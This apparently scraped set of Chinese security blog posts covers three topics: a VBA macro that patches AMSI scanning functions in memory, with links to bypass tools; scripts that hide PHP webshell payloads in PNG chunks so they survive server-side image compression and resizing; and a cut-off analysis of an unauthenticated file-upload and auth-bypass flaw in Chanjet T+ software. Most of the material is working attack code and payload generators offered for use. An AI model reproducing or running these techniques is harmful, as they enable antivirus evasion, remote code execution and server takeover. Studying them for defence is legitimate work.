hStdInput As Long hStdOutput As Long hStdError As LongEnd Type Const CREATE_NO_WINDOW = &amp;H8000000Const CREATE_NEW_CONSOLE = &amp;H10 Function LoadDll(dll As String, func As String) As LongPtr Dim AmsiDLL As LongPtr AmsiDLL = LoadLibrary(dll)LoadDll = GetProcAddress(AmsiDLL, func) End Function Function GetBuffer(LeakedAmsiDllAddr As LongPtr, TraverseOffset As Integer) As String Dim LeakedBytesBuffer As StringDim LeakedByte As LongPtrDim TraverseStartAddr As LongPtr On Error Resume Next TraverseStartAddr = LeakedAmsiDllAddr - TraverseOffset Dim i As IntegerFor i = 0 To TraverseOffset Peek LeakedByte, ByVal (TraverseStartAddr + i), 1 If LeakedByte &lt; 16 Then FixedByteString = &quot;0&quot; &amp; Hex(LeakedByte) LeakedBytesBuffer = LeakedBytesBuffer &amp; FixedByteString Else LeakedBytesBuffer = LeakedBytesBuffer &amp; Hex(LeakedByte) End IfNext i GetBuffer = LeakedBytesBuffer End Function Function FindPatchOffset(LeakedAmsiDllAddr As LongPtr, TraverseOffset As Integer, InstructionInStringOffset As Integer) As LongPtr Dim memOffset As Integer memOffset = (InstructionInStringOffset - 1) / 2FindPatchOffset = (LeakedAmsiDllAddr - TraverseOffset) + memOffset End Function Sub x64_office() Dim LeakedAmsiDllAddr As LongPtr Dim ScanBufferMagicBytes As StringDim ScanStringMagicBytes As StringDim LeakedBytesBuffer As StringDim AmsiScanBufferPatchAddr As LongPtrDim AmsiScanStringPatchAddr As LongPtrDim TrvOffset As Integer Dim InstructionInStringOffset As IntegerDim Success As Integer ScanBufferMagicBytes = &quot;4C8BDC49895B08&quot;ScanStringMagicBytes = &quot;4883EC384533DB&quot;TrvOffset = 352Success = 0 LeakedAmsiDllAddr = LoadDll(&quot;amsi.dll&quot;, &quot;AmsiUacInitialize&quot;) LeakedBytesBuffer = GetBuffer(LeakedAmsiDllAddr, TrvOffset) InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanBufferMagicBytes)If InstructionInStringOffset = 0 Then &#x27; MsgBox &quot;We didn&#x27;t find the scanbuffer magicbytes :/&quot;Else AmsiScanBufferPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset) Result = VirtualProtect(ByVal AmsiScanBufferPatchAddr, 32, 64, 0) ByteSwapper ByVal (AmsiScanBufferPatchAddr + 0), 1, Val(&quot;&amp;H&quot; &amp; &quot;90&quot;) ByteSwapper ByVal (AmsiScanBufferPatchAddr + 1), 1, Val(&quot;&amp;H&quot; &amp; &quot;C3&quot;) Success = Success + 1End If InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanStringMagicBytes)If InstructionInStringOffset = 0 Then &#x27; MsgBox &quot;We didn&#x27;t find the scanstring magicbytes :/&quot;Else AmsiScanStringPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset) Result = VirtualProtect(ByVal AmsiScanStringPatchAddr, 32, 64, 0) ByteSwapper ByVal (AmsiScanStringPatchAddr + 0), 1, Val(&quot;&amp;H&quot; &amp; &quot;90&quot;) ByteSwapper ByVal (AmsiScanStringPatchAddr + 1), 1, Val(&quot;&amp;H&quot; &amp; &quot;C3&quot;) Success = Success + 1End If If Success = 2 Then Call CallMeEnd If End Sub Sub x32_office() Dim LeakedAmsiDllAddr As LongPtr Dim ScanBufferMagicBytes As StringDim ScanStringMagicBytes As StringDim LeakedBytesBuffer As StringDim AmsiScanBufferPatchAddr As LongPtrDim AmsiScanStringPatchAddr As LongPtrDim TrvOffset As Integer Dim InstructionInStringOffset As IntegerDim Success As Integer ScanBufferMagicBytes = &quot;8B450C85C0745A85DB&quot;ScanStringMagicBytes = &quot;8B550C85D27434837D&quot;TrvOffset = 300Success = 0 LeakedAmsiDllAddr = LoadDll(&quot;amsi.dll&quot;, &quot;AmsiUacInitialize&quot;) LeakedBytesBuffer = GetBuffer(LeakedAmsiDllAddr, TrvOffset) InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanBufferMagicBytes)If InstructionInStringOffset = 0 Then &#x27; MsgBox &quot;We didn&#x27;t find the scanbuffer magicbytes :/&quot;Else AmsiScanBufferPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset) Debug.Print Hex(AmsiScanBufferPatchAddr) Result = VirtualProtect(ByVal AmsiScanBufferPatchAddr, 32, 64, 0) ByteSwapper ByVal (AmsiScanBufferPatchAddr + 0), 1, Val(&quot;&amp;H&quot; &amp; &quot;90&quot;) ByteSwapper ByVal (AmsiScanBufferPatchAddr + 1), 1, Val(&quot;&amp;H&quot; &amp; &quot;31&quot;) ByteSwapper ByVal (AmsiScanBufferPatchAddr + 2), 1, Val(&quot;&amp;H&quot; &amp; &quot;C0&quot;) Success = Success + 1End If InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanStringMagicBytes)If InstructionInStringOffset = 0 Then &#x27; MsgBox &quot;We didn&#x27;t find the scanstring magicbytes :/&quot;Else AmsiScanStringPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset) Debug.Print Hex(AmsiScanStringPatchAddr) Result = VirtualProtect(ByVal AmsiScanStringPatchAddr, 32, 64, 0) ByteSwapper ByVal (AmsiScanStringPatchAddr + 0), 1, Val(&quot;&amp;H&quot; &amp; &quot;90&quot;) ByteSwapper ByVal (AmsiScanStringPatchAddr + 1), 1, Val(&quot;&amp;H&quot; &amp; &quot;31&quot;) ByteSwapper ByVal (AmsiScanStringPatchAddr + 2), 1, Val(&quot;&amp;H&quot; &amp; &quot;D2&quot;) Success = Success + 1End If If Success = 2 Then Call CallMeEnd If End Sub Sub TestOfficeVersion() #If Win64 Then Call x64_office#ElseIf Win32 Then Call x32_office#End If End Sub Sub CallMe() Dim pInfo As PROCESS_INFORMATIONDim sInfo As STARTUPINFODim sNull As StringDim lSuccess As LongDim lRetValue As Long lSuccess = CreateProcess(sNull, &quot;calc.exe&quot;, ByVal 0&amp;, ByVal 0&amp;, 1&amp;, CREATE_NEW_CONSOLE, ByVal 0&amp;, sNull, sInfo, pInfo) lRetValue = CloseHandle(pInfo.hThread)lRetValue = CloseHandle(pInfo.hProcess) End Sub 6. 总结powershell绕过方法不适合mimikatz，可以执行powershell版的mimikatz，但是会被杀毒软件（defender等）查杀。 由于AMSI.DLL和提供程序的DLL加载到潜在攻击者所在的相同内存空间，因此破坏操作更容易。 AMSI提供程序的内存以及AMSI.dll内存空间应受到保护 AMSI的Un-initialization可能会让我们找到通过干扰AMSI初始化过程来禁用AMSI的新方法，一种不同于当前干扰AMSI扫描过程的技术。 7. 附几个实用工具1.使用AMSI分析脚本 将二进制文件作为输入将其拆分，直到它精确定位目标引擎将标记的字节，并将其打印到屏幕上。当试图识别工具&#x2F;负载中的特定被标记代码时，这会很有帮助。 AmsiScanner实用安全分析：https://github.com/pracsec/AmsiScanner/ ThreatCheck：https://github.com/rasta-mouse/ThreatCheck 2.绕过AMSI 通过将文件分割为多个较小的文件来绕过AMSI，AMSI_Lines：https://github.com/x4sh3s/AMSI_Lines https://github1s.com/kymb0/Stealth_shellcode_runners https://github1s.com/boku7/injectAmsiBypass 3.注册AMSI 提供商来做权限维持：https://github.com/netbiosX/AMSI-Provider 4.脚本混淆器：https://github.com/danielbohannon/Invoke-Obfuscation","tags":[{"name":"AMSI","slug":"AMSI","permalink":"https://mrwq.github.io/tags/AMSI/"},{"name":"bypass","slug":"bypass","permalink":"https://mrwq.github.io/tags/bypass/"}]},{"title":"在PNG中注入PHP代码","path":"在PNG中注入PHP代码/","text":"环境准备图片马想要执行需要的条件： 1.图片可以上传到目标服务器上。 2.图片可解析为PHP代码。 要满足第一个条件，可能的方式有文件上传、远程文件下载、SSRF等方式。 要满足第二个条件可能的方式有上传比如png格式木马但是可以改名为php，从而解析为php；或者可以修改.htacces文件来控制这个php解析类型，使其支持解析png为php代码执行；或者是只能上传png格式图片，但是可以文件包含这个png来执行php代码。 当然以上描述的情况这个跟目标环境有关系。为了方便测试，我制作了一个docker镜像。镜像中web服务支持文件上传，上传时会检查MIME类型是否为图片，但是不检查上传文件的扩展名。这表示可以上传一个图片格式的.php文件到服务器上。 12docker pull ordar/astrolockdocker run -d -p 80:80 ordar/astrolock PNG结构 PNG的基本构成为： 8字节头文件+4字节数据长度+4字节数据标识符+数据块数据+4字节CRC校验码 PNG图片由很多数据块组成，每个数据块包含了不同的信息。PNG定义了两种类型的数据块： 一种是称为关键数据块(critical chunk)，这是标准的数据块，每个PNG文件必须包含。 另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。 关键数据块关键数据块包括：文件头数据块、调色板数据块、图像数据块和图像结束数据块 “89 50 4E 47 00 DA 1A 0A” png文件的标识符 文件头数据块IHDR 调色板数据块PLTE 图像数据块IDAT 图像结束数据块IEND 辅助数据块其余 18 个块类型称为辅助块类型， 编码器可以生成哪些，解码器可以解释。 透明度信息：tRNS色彩空间信息：cHRM、gAMA、iCCP、sBIT、sRGB、cICP文本信息：iTXt，tEXt，zTXt杂项信息：bKGD、hIST、pHYs、sPLT、eXIf时间信息：tIME动画信息：acTL，fcTL，fdAT 部分数据块如下： 数据块符号 数据块名称 多数据块 可选否 位置限制 IHDR 文件头数据块 否 否 第一块 cHRM 基色和白色点数据块 否 是 在PLTE和IDAT之前 gAMA 图像γ数据块 否 是 在PLTE和IDAT之前 sBIT 样本有效位数据块 否 是 在PLTE和IDAT之前 PLTE 调色板数据块 否 是 在IDAT之前 bKGD 背景颜色数据块 否 是 在PLTE之后IDAT之前 hIST 图像直方图数据块 否 是 在PLTE之后IDAT之前 tRNS 图像透明数据块 否 是 在PLTE之后IDAT之前 pHYs 物理像素尺寸块 否 是 在IDAT之前 IDAT 图像数据块 是 否 与其他IDAT连续 tIME 图像最后修改时间数据块 否 是 无限制 tEXt 文本信息数据块 是 是 无限制 zTXt 压缩文本数据块 是 是 无限制 IEND 图像结束数据块 否 否 最后一个数据块 在PNG中注入PHP代码first-part 简单插入查看**&#x2F;first-part**的源代码，这非常简单：网络表单需要标题、描述和有效的PNG文件。然后，应用程序将从上传的图像文件中获取数据，从原始文件名构建一个唯一的文件名，并将文件简单地存储在文件系统中（suits_thumbnails目录中，可公开访问）。 123456789101112131415161718192021222324252627# 创建“suit”对象并将其链接到Symfony表单$suit = new Suit();$form = $this-&gt;createForm(SuitType::class, $suit);$form-&gt;handleRequest($request);# 如果用户定义了标题、描述并上传了JPG/PNG MIME类型的文件，则表单将提交并有效if ($form-&gt;isSubmitted() &amp;&amp; $form-&gt;isValid()) &#123; # 获取通过表单上传的文件，从原始文件名构建一个唯一的文件名 $suitFile = $form-&gt;get(&#x27;suit&#x27;)-&gt;getData(); $originalFilename = $suitFile-&gt;getClientOriginalName(); $newFilename = uniqid().&#x27;_&#x27;.$originalFilename; # 将上传的文件用唯一文件名存储在Web服务器上的缩略图目录/suits_thumbnails/中 try &#123; $suitFile-&gt;move( $this-&gt;getParameter(&#x27;thumbnails_directory&#x27;), $newFilename ); $suit-&gt;setSuitFilename($newFilename); &#125; catch (FileException $e) &#123; return new Response(&quot;File exception&quot;); &#125; # 将“suit”对象存储在数据库中以在应用程序中显示 $entityManager-&gt;persist($suit); $entityManager-&gt;flush(); return $this-&gt;redirectToRoute(&#x27;app_first_part&#x27;);&#125; 方法一 直接拼接网上搜索图片马制作的方法，很容易就能找到的方法就是这种。以下方法的效果是等效的。 1.文本方式打开图片，然后末尾粘贴一句话木马； 2.cmd中 copy 1.png &#x2F;b + 2.php 3.png 3.使用echo命令追加代码到png图片末尾 这种方法已经烂大街了，这里就不多说了，懂得都懂。在png图像结束块IEND后面紧跟着phpinfo。 方法二 预定义文本块注入PNG 图像格式允许向文件添加注释以存储一些meta data数据。通过查阅PNG文档可以找到已经定义的文本块关键字。 当然这些关键字是可以修改的，通过下载工具https://exiftool.org/来设置这些预定义关键字。 当然它是可以成功解析的，可以看到文本块copyright后面紧接着就是phpinfo。 PHP-GD库的压缩图像大多数时候，图像文件不会像&#x2F;first-part所假设的那样按原样存储在服务器上。而是使用一些标准的PHP 库（如 PHP-GD）将图像调整大小、压缩或编码为特定的文件格式。 &#x2F;second-part 路径为攻击者实现了一个稍微更现实、也更困难的场景。在存储用户上传的文件之前，应用程序将使用 PHP-GD 函数 imagepng 压缩所有上传到 Web 服务器的图像。 12345678910111213141516171819202122232425262728# 创建“suit”对象并将其链接到Symfony表单$suit = new Suit();$form = $this-&gt;createForm(SuitType::class, $suit);$form-&gt;handleRequest($request);# 如果用户定义了标题、描述并上传了JPG/PNG MIME类型的文件，则表单将提交并有效if ($form-&gt;isSubmitted() &amp;&amp; $form-&gt;isValid()) &#123; # 从表单中获取上传文件 $suitFile = $form-&gt;get(&#x27;suit&#x27;)-&gt;getData(); # 从原始文件名生成唯一的文件名 $originalFilename = $suitFile-&gt;getClientOriginalName(); $newFilename = uniqid().&#x27;_&#x27;.$originalFilename; try &#123; # 压缩上传的PNG（gzip库的第9级）并保存 $source = imagecreatefrompng($suitFile-&gt;getPathName()); imagepng($source, $this-&gt;getParameter(&#x27;thumbnails_directory&#x27;).&#x27;/&#x27;.$newFilename, 9); $suit-&gt;setSuitFilename($newFilename); &#125; catch (FileException $e) &#123; return new Response(&quot;Exception in image processing&quot;); &#125; # 将“suit”对象存储在数据库中以在应用程序中显示 $entityManager-&gt;persist($suit); $entityManager-&gt;flush(); return $this-&gt;redirectToRoute(&#x27;app_second_part&#x27;);&#125; 方法三 PLTE块注入压缩 PNG 文件时，PHP-GD将删除辅助块以减小输出文件的大小。这就是为什么我们在第一部分中注入的PHP payload无法在压缩过程中幸存下来。 但是，如果我们可以将我们的payload注入到 PNG 文件的关键块中呢？当然，这些块在压缩图像时不会被破坏。执行这种注入的完美候选者是 PLTE 块，这是一个包含 PNG 图像的“调色板”的关键块，即颜色列表。根据 PNG 规范： PLTE 块包含 1 到 256 个调色板条目，每个条目都是三字节的形式： 123Red: 1 byte (0 = black, 255 = red)Green: 1 byte (0 = black, 255 = green)Blue: 1 byte (0 = black, 255 = blue) 使用PLTE块，我们可能有256*3字节可用于将我们的payload注入到这样一个关键块中，这应该绰绰有余。唯一的限制是有效载荷的长度必须能被3整除。 使用下面的脚本，可以轻松创建PLTE块注入payload的png图像。 12345678910111213141516171819202122232425262728293031323334&lt;?php if(count($argv) != 3) exit(&quot;Usage $argv[0] &lt;PHP payload&gt; &lt;Output file&gt;&quot;); $_payload = $argv[1];$output = $argv[2]; while (strlen($_payload) % 3 != 0) &#123; $_payload.=&quot; &quot;; &#125;$_pay_len=strlen($_payload);if ($_pay_len &gt; 256*3)&#123; echo &quot;FATAL: The payload is too long. Exiting...&quot;; exit();&#125;if($_pay_len %3 != 0)&#123; echo &quot;FATAL: The payload isn&#x27;t divisible by 3. Exiting...&quot;; exit();&#125;$width=$_pay_len/3;$height=20;$im = imagecreate($width, $height); $_hex=unpack(&#x27;H*&#x27;,$_payload);$_chunks=str_split($_hex[1], 6); for($i=0; $i &lt; count($_chunks); $i++)&#123; $_color_chunks=str_split($_chunks[$i], 2); $color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2])); imagesetpixel($im,$i,1,$color);&#125; imagepng($im,$output); 执行脚本： 1php gen.php &#x27;&lt;?php phpinfo(); ?&gt;&#x27; png-plte-inject.php 使用PLTE注入可以绕过PHP-GD库的压缩，可以成功上传并且成功解析。 PHP-GD库调整图像大小Web 应用程序在处理图像时执行的另一个标准操作是调整它们的大小以标准化它们的格式。为此，应用程序可以例如使用PHP-GD库imagecopyresized函数或 imagecopyresampled函数。 &#x2F;third-part路由实现了目标应用程序在存储输入PNG 文件之前对其进行压缩和调整大小的场景。 123456789101112131415161718192021222324252627282930313233# 创建“suit”对象并将其链接到Symfony表单$suit = new Suit();$form = $this-&gt;createForm(SuitType::class, $suit);$form-&gt;handleRequest($request);# 如果用户定义了标题、描述并上传了JPG/PNG MIME类型的文件，则表单将提交并有效if ($form-&gt;isSubmitted() &amp;&amp; $form-&gt;isValid()) &#123; # 从表单中获取上传文件 $suitFile = $form-&gt;get(&#x27;suit&#x27;)-&gt;getData(); # 从原始文件名生成唯一的文件名 $originalFilename = $suitFile-&gt;getClientOriginalName(); $newFilename = uniqid().&#x27;_&#x27;.$originalFilename; try &#123; # 压缩上传的PNG（gzip库的第9级），调整大小并保存 $filename = $suitFile-&gt;getPathName(); list($width, $height) = getimagesize($filename); $source = imagecreatefrompng($filename); $thumb = imagecreatetruecolor(55, 55); imagecopyresampled($thumb, $source, 0, 0, 0, 0, 55, 55, $width, $height); imagepng($thumb, $this-&gt;getParameter(&#x27;thumbnails_directory&#x27;).&#x27;/&#x27;.$newFilename); $suit-&gt;setSuitFilename($newFilename); &#125; catch (FileException $e) &#123; return new Response(&quot;Exception in image processing&quot;); &#125; # 将“suit”对象存储在数据库中以在应用程序中显示 $entityManager-&gt;persist($suit); $entityManager-&gt;flush(); return $this-&gt;redirectToRoute(&#x27;app_third_part&#x27;);&#125; 方法四 IDAT块注入调整图像大小时，即使是 PLTE关键块的内容也会被破坏,我们的payload也会随之破坏。这些函数实际上只使用原始文件中的像素数据来创建一个全新的图像。关键数据块或辅助数据块中包含的数据都可能会被忽略。 将PHP载荷注入PNG文件的一种相当复杂但有效的方法是将其编码为PNG的IDAT块。 当将原始图像保存为PNG时，图像的每一行都按字节进行过滤，并且该行前缀有一个数字，该数字描述了所使用的过滤器类型（0x01到0x05），不同的行可以使用不同的过滤器。这背后的基本原理是提高压缩比。过滤完所有行后，它们都使用 DEFLATE 算法压缩以形成 IDAT 块。 要生成一个包含有效PHP代码的IDAT 块，应该找到原始像素的精确组合，这些像素一旦被 PNG线过滤器和DEFLATE算法处理，就会输出所需的有效载荷。 字符串不能包含任何重复的代码块，否则它们将被压缩。 虽然很难，但确实是可以实现的。 可以使用以下脚本来生成110x110的PNG图像，一旦调整为55x55，IDAT汇总将包含 PHP 代码：**** 12345678910111213141516171819&lt;?php header(&#x27;Content-Type: image/png&#x27;); $p = array(0xA3, 0x9F, 0x67, 0xF7, 0x0E, 0x93, 0x1B, 0x23, 0xBE, 0x2C, 0x8A, 0xD0, 0x80, 0xF9, 0xE1, 0xAE, 0x22, 0xF6, 0xD9, 0x43, 0x5D, 0xFB, 0xAE, 0xCC, 0x5A, 0x01, 0xDC, 0xAA, 0x52, 0xD0, 0xB6, 0xEE, 0xBB, 0x3A, 0xCF, 0x93, 0xCE, 0xD2, 0x88, 0xFC, 0x69, 0xD0, 0x2B, 0xB9, 0xB0, 0xFB, 0xBB, 0x79, 0xFC, 0xED, 0x22, 0x38, 0x49, 0xD3, 0x51, 0xB7, 0x3F, 0x02, 0xC2, 0x20, 0xD8, 0xD9, 0x3C, 0x67, 0xF4, 0x50, 0x67, 0xF4, 0x50, 0xA3, 0x9F, 0x67, 0xA5, 0xBE, 0x5F, 0x76, 0x74, 0x5A, 0x4C, 0xA1, 0x3F, 0x7A, 0xBF, 0x30, 0x6B, 0x88, 0x2D, 0x60, 0x65, 0x7D, 0x52, 0x9D, 0xAD, 0x88, 0xA1, 0x66, 0x94, 0xA1, 0x27, 0x56, 0xEC, 0xFE, 0xAF, 0x57, 0x57, 0xEB, 0x2E, 0x20, 0xA3, 0xAE, 0x58, 0x80, 0xA7, 0x0C, 0x10, 0x55, 0xCF, 0x09, 0x5C, 0x10, 0x40, 0x8A, 0xB9, 0x39, 0xB3, 0xC8, 0xCD, 0x64, 0x45, 0x3C, 0x49, 0x3E, 0xAD, 0x3F, 0x33, 0x56, 0x1F, 0x19 ); $img = imagecreatetruecolor(55, 55); for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;$r = $p[$y];$g = $p[$y+1];$b = $p[$y+2];$color = imagecolorallocate($img, $r, $g, $b);imagesetpixel($img, round($y / 3), 0, $color);&#125; imagepng($img); ?&gt; 此脚本生成恶意 PNG 图像： 1php generate_idat_png.php &gt; png-idat-inject.php 这时候将生成的图像通过&#x2F;third-part路由上传，就可以触发webshell。 通过发送POST请求来触发php执行。 IMAGICK库调整图像大小除了PHP-GD之外，最流行的图像处理库之一是Imagick，它是ImageMagick的PHP实现。&#x2F;fourth-part路由说明了一个应用程序，它使用thumbnailImage功能调整用户上传的文件的大小。此函数用于产生较小的low-cost缩略图图像，适合在Web上显示。 123456789101112131415161718192021222324252627282930313233# 创建“suit”对象并将其链接到Symfony表单$suit = new Suit();$form = $this-&gt;createForm(SuitType::class, $suit);$form-&gt;handleRequest($request);# 如果用户定义了标题、描述并上传了JPG/PNG MIME类型的文件，则表单将提交并有效if ($form-&gt;isSubmitted() &amp;&amp; $form-&gt;isValid()) &#123; # 从表单中获取上传文件 $suitFile = $form-&gt;get(&#x27;suit&#x27;)-&gt;getData(); # 从原始文件名生成唯一的文件名 if ($suitFile) &#123; $originalFilename = $suitFile-&gt;getClientOriginalName(); $newFilename = uniqid().&#x27;_&#x27;.$originalFilename; try &#123; # 使用Imagick将文件转换为100x100缩略图 $filename = $suitFile-&gt;getPathName(); $imgck = new Imagick($filename); $imgck-&gt;thumbnailImage(55, 55, true, true); $imgck-&gt;writeImage($this-&gt;getParameter(&#x27;thumbnails_directory&#x27;).&quot;/&quot;.$newFilename); $suit-&gt;setSuitFilename($newFilename); &#125; catch (Exception $e) &#123; return New Response(&quot;Exception in image processing&quot;); &#125; &#125; #将“suit”对象存储在数据库中以在应用程序中显示 $entityManager-&gt;persist($suit); $entityManager-&gt;flush(); return $this-&gt;redirectToRoute(&#x27;app_fourth_part&#x27;);&#125; 方法五 自定义文本块注入当Imagick调整图像大小时，它实际上会对文本块执行几个操作： 擦除标记为“Comment”的tEXt块。 覆盖以下tEXt块的值（或者如果它们不存在则定义它们）：date:create, date:modify, software, Thumb::Document::Pages, Thumb::Image::Height, Thumb::Image::Width, Thumb::Mimetype, Thumb::MTime, Thumb::Size, Thumb::URI。 保留任何其他tEXt块的原始值（包括不存在预定义关键字的tEXt块）。 在方法二的PNG注释中，我们已经知道了预定义的tEXt块的预定义关键字有如下这些： 因为我们修改的是copyright块，所以是可以绕过thumbnailImage方法的处理的。 使用方法二的图像，可以成功执行。如下图，可以看到它并不是紧跟在tEXt块后面执行。 除了以上预定义关键字，我们还可以自定义关键字。通过以下简单的python代码可以实现。 123456789101112# -*- coding: utf-8 -*-# @Author : ordar# @Python: 3.7.5from PIL import Imagefrom PngImagePlugin import PngInfoim = Image.open(&quot;png/png.png&quot;)p = PngInfo()# PngInfo类有两个方法add_itxt和add_text，这两个方法实现的效果是一样的。# iTXt是国际文本数据；iEXt是文本信息数据块# p.add_itxt(b&quot;Aaaaa&quot;, b&quot;&lt;?php phpinfo(); ?&gt;&quot;)p.add_text(b&quot;Aaaaa&quot;, b&quot;&lt;?php phpinfo(); ?&gt;&quot;)im.save(&quot;png/png-text-custom.png&quot;,pnginfo=p) 用exiftool工具查看图片信息，可以发现Aaaaa文本信息成功添加进去了。 当然也可以解析执行。 总结当服务器可以将图像文件解释为PHP时，例如弱扩展检查、解析漏洞、本地文件包含漏洞、错误配置PHP解析扩展等方式，可以使用这些技术来造成代码执行。 不处理图像 PHP-GD 压缩图像 PHP-GD调整图像大小 Imagick调整图像大小 直接拼接 可以解析 不可以 不可以 不可以 预定义文本块注入 可以解析 不可以 不可以 部分预定义的关键字可以解析 PLTE块注入 可以解析 可以解析 不可以 不可以 IDAT块注入 可以解析 可以解析 可以解析 可以解析 自定义文本块注入 可以解析 不可以 不可以 可以解析","tags":[{"name":"bypass","slug":"bypass","permalink":"https://mrwq.github.io/tags/bypass/"},{"name":"PHP","slug":"PHP","permalink":"https://mrwq.github.io/tags/PHP/"},{"name":"PNG","slug":"PNG","permalink":"https://mrwq.github.io/tags/PNG/"}]},{"title":"用友畅捷通T+未授权任意文件上传漏洞（0day）分析与复现","path":"用友畅捷通T+未授权任意文件上传漏洞（0day）分析与复现/","text":"1.简述畅捷通信息技术股份有限公司（以下简称畅捷通公司）是用友集团成员企业。畅捷通T+软件是畅捷通公司开发的ERP管理软件，采用B&#x2F;S结构及NET开发技术，面向中小型工贸和商贸企业提供财务管理、采购管理、库存管理等业务功能，其产品目前有单机、公有云和云主机三种售卖形态。 2022年8月29日和8月30日，畅捷通公司紧急发布安全补丁修复了畅捷通T+软件任意文件上传漏洞。未经身份认证的攻击者利用该漏洞，通过绕过系统鉴权，在特定配置环境下实现任意文件的上传，从而执行任意代码，获得服务器控制权限。目前，已有用户被不法分子利用该漏洞进行勒索病毒攻击的情况出现。 CNVD对该漏洞的综合评级为“高危”。 2.漏洞位置查找漏洞搭建过程不多赘述，先安装SQLserver版本要大于2008，然后点击安装包一直下一步就可以了。 安装完成之后查找代码路径，查看80端口的pid，然后通过pid的命令行找到畅捷通内置nginx的程序和nginx配置路径 然后再nginx目录下发现readme.txt，里面记录了如何修改监听端口，和如何修改虚拟目录。查看虚拟目录的配置，可以找到网站源代码路径：C:\\Program Files (x86)\\Chanjet\\TPlusPro\\WebSite。这个是默认安装路径。 根据网上透露的一点点细节可以知道，漏洞根源在于Upload.aspx文件，然后用everything来搜索Upload.aspx。发现有三个，接下来挨个来看。 找到Upload.aspx文件打开之后发现没有源代码，而是一句话“这是预编译工具生成的标记文件，不应删除!”。怀疑有加密，然后就去百度加密方法，经过一番搜索终于得知，这不是加密而是ASP.NET 预编译。ASP.NET 可以预编译网站，然后再将其提供给用户。这样做有很多优点，包括缩短响应时间、执行错误检查、保护源代码以及提高部署效率。 3.预编译如何查找源代码想要看到我们心心念念的源代码就势必要对预编译的结果进行反编译。根据网上教程，要找到源代码就需要先在bin目录下找到compiled文件。三个Upload.aspx对应生成了三个compiled文件，这里没办法直接看出他们的一一对应关系，所以还需要看compiled文件内容。 从下图可以看出，compiled文件里面记录了预编译前aspx的文件路径。 同时还记录了预编译之后生成的dll文件名。 为什么aspx记录的是文件路径而dll记录的是文件名？因为dll和compiled统一放在bin目录下，而aspx放在原来的位置。 4.漏洞分析这里使用ILSpy来查看dll源代码。 查看三个Upload.aspx源代码，确定了出现问题的代码文件是&#x2F;WebSite&#x2F;SM&#x2F;SetupAccount&#x2F;Upload.aspx 代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// CommonPage_SetupAccount_Uploadusing System;using System.Web.Profile;using System.Web.SessionState;using System.Web.UI;using System.Web.UI.HtmlControls;using ASP;public class CommonPage_SetupAccount_Upload : Page, IRequiresSessionState&#123; protected HtmlInputFile File1; protected HtmlForm form1; private string PhotoTooLarge = &quot;PhotoTooLarge&quot;; private string PhotoTypeError = &quot;PhotoTypeError&quot;; protected DefaultProfile Profile =&gt; (DefaultProfile)Context.Profile; protected global_asax ApplicationInstance =&gt; (global_asax)(object)Context.ApplicationInstance; private void ReadResources() &#123; PhotoTooLarge = GetGlobalResourceObject(&quot;Account&quot;, &quot;PhotoTooLarge&quot;).ToString(); PhotoTypeError = GetGlobalResourceObject(&quot;Account&quot;, &quot;PhotoTypeError&quot;).ToString(); &#125; protected void Page_Load(object sender, EventArgs e) &#123; ReadResources(); if (base.Request.Files.Count == 1) &#123; string text = &quot;images/index.gif&quot;; object obj = ViewState[&quot;fileName&quot;]; if (obj != null) &#123; text = obj.ToString(); &#125; if (File1.PostedFile.ContentLength &gt; 204800) &#123; base.Response.Write(&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot; + PhotoTooLarge + &quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot; + text + &quot;&#x27;;&lt;/script&gt;&quot;); &#125; else if (File1.PostedFile.ContentType != &quot;image/jpeg&quot; &amp;&amp; File1.PostedFile.ContentType != &quot;image/bmp&quot; &amp;&amp; File1.PostedFile.ContentType != &quot;image/gif&quot; &amp;&amp; File1.PostedFile.ContentType != &quot;image/pjpeg&quot;) &#123; base.Response.Write(&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot; + PhotoTypeError + &quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot; + text + &quot;&#x27;;&lt;/script&gt;&quot;); &#125; else &#123; string fileName = File1.PostedFile.FileName; string text2 = fileName.Substring(fileName.LastIndexOf(&#x27;\\\\&#x27;) + 1); File1.PostedFile.SaveAs(base.Server.MapPath(&quot;.&quot;) + &quot;\\\\images\\\\&quot; + text2); string value = base.Server.MapPath(&quot;.&quot;) + &quot;\\\\images\\\\&quot; + text2; ViewState[&quot;fileName&quot;] = &quot;images/&quot; + text2; Session[&quot;ImageName&quot;] = value; &#125; &#125; &#125;&#125; 4.1文件上传漏洞简单分析代码可知，这里存在两个漏洞，一个是文件上传，另一个是目录穿越。 先查看文件上传漏洞，上传文件的条件有两个： 1.文件大小要小于或等于204800 2.文件类型必须为image&#x2F;jpeg、image&#x2F;bmp、image&#x2F;gif、image&#x2F;pjpeg其中之一 然后构造上传表单，action写上传路径。 1234&lt;form action=&quot;http://192.168.100.42/tplus/SM/SetupAccount/Upload.aspx&quot; name=&quot;form1&quot; id=&quot;form1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input name=&quot;File1&quot; type=&quot;file&quot; id=&quot;File1&quot;&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;上 传&quot;&gt;&lt;/form&gt; 然后通过burpsuit抓包，这样方便改包。不管我怎样尝试，只有在cookie中有session是才能上传成功 4.2认证绕过漏洞就在我百思不得的时候，突然我注意到一个字眼 漏洞根源在于Upload.aspx文件存在认证缺陷，向该文件传递preload参数可直接绕过系统权限认证，从而实现任意文件上传。 然后开fuzz参数perload参数，最终fuzz出的参数为1 